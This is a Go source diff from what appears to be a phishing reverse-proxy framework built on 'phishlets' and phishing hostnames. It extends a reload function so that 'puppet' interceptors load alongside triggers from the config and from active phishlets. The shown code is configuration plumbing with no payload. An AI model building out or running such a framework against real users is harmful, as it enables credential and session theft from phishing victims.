@@ -1756,23 +1756,29 @@ func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
 	return nil
 }
 
-// ReloadPuppetTriggers reloads all puppet triggers from config and phishlets
+// ReloadPuppetTriggers reloads all puppet triggers and interceptors from config and phishlets
 func (p *HttpProxy) ReloadPuppetTriggers() {
 	if p.interceptor == nil {
 		return
 	}
 
 	p.interceptor.ClearTriggers()
+	p.interceptor.ClearInterceptors()
 
-	// 1. Load global triggers
-	for _, trigger := range p.cfg.GetPuppetConfig().Triggers {
+	// 1. Load global triggers and interceptors
+	puppetCfg := p.cfg.GetPuppetConfig()
+	for _, trigger := range puppetCfg.Triggers {
 		if trigger.Enabled {
 			t := trigger // Copy for pointer
 			p.interceptor.AddTrigger(&t)
 		}
 	}
+	for _, interceptor := range puppetCfg.Interceptors {
+		i := interceptor // Copy for pointer
+		p.interceptor.AddInterceptor(&i)
+	}
 
-	// 2. Load triggers from active phishlets
+	// 2. Load from active phishlets
 	enabledSites := p.cfg.GetEnabledSites()
 	for _, site := range enabledSites {
 		pl, err := p.cfg.GetPhishlet(site)
@@ -1780,20 +1786,27 @@ func (p *HttpProxy) ReloadPuppetTriggers() {
 			continue
 		}
 
+		// Load triggers
 		for _, trigger := range pl.puppet.Triggers {
 			if trigger.Enabled {
 				t := trigger // Copy for pointer
-				// Ensure phishlet name is set if missing
 				if t.Phishlet == "" {
 					t.Phishlet = site
 				}
 				p.interceptor.AddTrigger(&t)
-				log.Debug("[PROXY] Loaded puppet trigger %s from phishlet %s", t.Id, site)
 			}
 		}
+
+		// Load interceptors
+		for _, interceptor := range pl.puppet.Interceptors {
+			i := interceptor // Copy for pointer
+			p.interceptor.AddInterceptor(&i)
+		}
+		
+		log.Debug("[PROXY] Loaded puppet config from phishlet %s", site)
 	}
 
-	log.Info("puppet: reloaded all triggers")
+	log.Info("puppet: reloaded all triggers and interceptors")
 }
 
 func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
